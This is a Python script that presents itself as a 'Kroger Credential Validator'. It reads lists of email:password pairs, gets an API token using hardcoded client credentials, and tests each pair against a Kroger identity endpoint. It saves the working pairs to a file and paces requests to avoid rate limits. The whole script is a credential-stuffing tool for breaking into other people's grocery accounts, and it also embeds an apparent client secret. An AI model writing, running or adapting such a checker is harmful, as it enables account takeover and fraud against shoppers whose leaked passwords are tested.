#!/usr/bin/env python3
"""
Final Automated Kroger Credential Validator
Terminal-based with proper indentation and error handling
"""

import argparse
import os
import requests
import time
from requests.auth import HTTPBasicAuth
from datetime import datetime

# Official App Credentials
CLIENT_ID = "cartgenie-243261243034244c417a71504b73515051764a384a2e50532e7a39454f634b4c773257557971576a69374e784b6f4c64626b6b4754346846333761712748587326129489921"
CLIENT_SECRET = "r3JCQqSYNyld9A5njdTkhNDxMf86MTel50Oy4PP9"

def get_client_token():
    """Obtain client access token"""
    try:
        auth = HTTPBasicAuth(CLIENT_ID, CLIENT_SECRET)
        response = requests.post(
            "https://api.kroger.com/v1/connect/oauth2/token",
            auth=auth,
            data={'grant_type': 'client_credentials', 'scope': 'profile.compact'},
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            timeout=10
        )
        response.raise_for_status()
        return response.json().get('access_token')
    except Exception as e:
        raise Exception(f"Failed to get client token: {str(e)}")

def validate_credential(email, password, token):
    """Validate single credential pair"""
    try:
        headers = {
            'Authorization': f'Bearer {token}',
            'Content-Type': 'application/json'
        }
        response = requests.post(
            "https://api.kroger.com/v1/identity/validate",
            headers=headers,
            json={'email': email, 'password': password},
            timeout=10
        )
        
        if response.status_code == 200:
            return True, "Valid credential"
        return False, f"Invalid (Code: {response.status_code})"
    except Exception as e:
        return False, f"Error: {str(e)}"

def process_file(input_path, output_dir="results"):
    """Process credential file with proper error handling"""
    os.makedirs(output_dir, exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    valid_path = os.path.join(output_dir, f"valid_{timestamp}.txt")
    invalid_path = os.path.join(output_dir, f"invalid_{timestamp}.txt")
    
    try:
        token = get_client_token()
        with open(input_path) as infile, \
             open(valid_path, 'w') as valid_out, \
             open(invalid_path, 'w') as invalid_out:
            
            for line in infile:
                line = line.strip()
                if not line or ':' not in line:
                    continue
                    
                email, password = line.split(':', 1)
                valid, message = validate_credential(email, password, token)
                result = f"{email}:{password} - {message}"
                print(result)
                
                if valid:
                    valid_out.write(f"{result}\n")
                else:
                    invalid_out.write(f"{result}\n")
                
                time.sleep(1)  # Rate limiting
                
        print(f"\nValidation complete. Results saved to:\n- {valid_path}\n- {invalid_path}")
    except Exception as e:
        print(f"Fatal error: {str(e)}")
        raise

def main():
    parser = argparse.ArgumentParser(description="Kroger Credential Validator")
    parser.add_argument("-f", "--file", required=True, help="Input file with credentials (email:password per line)")
    parser.add_argument("-o", "--output", default="results", help="Output directory (default: results)")
    args = parser.parse_args()
    
    try:
        process_file(args.file, args.output)
    except Exception:
        print("Script terminated due to errors")

if __name__ == "__main__":
    main()